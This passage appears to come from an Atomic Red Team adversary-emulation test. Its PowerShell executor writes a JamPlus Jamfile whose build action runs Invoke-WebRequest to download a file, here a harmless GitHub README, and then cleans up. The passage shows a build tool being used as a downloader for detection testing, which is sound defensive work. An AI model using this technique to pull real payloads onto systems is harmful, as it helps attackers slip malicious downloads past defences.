        } else {
          Write-Warning "Jambase.jam was not found anywhere in the extracted archive. JamPlus will fail to parse Jamfiles until this is resolved."
        }
      }
  executor:
    name: powershell
    command: |
      New-Item -ItemType Directory -Path "#{work_dir}" -Force | Out-Null
      @"
      actions Stage
      {
          powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/README.md' -OutFile '#{staged_file}' -UseBasicParsing"
      }
      Stage payload ;
      NotFile payload ;
      Always payload ;
      Depends all : payload ;
      "@ | Set-Content -Path "#{work_dir}\Jamfile.jam"
      Push-Location "#{work_dir}"
      & "#{jam_path}"
      Pop-Location
    cleanup_command: |
      Remove-Item -Recurse -Force "#{work_dir}" -ErrorAction Ignore
      Remove-Item "#{staged_file}" -Force -ErrorAction Ignore
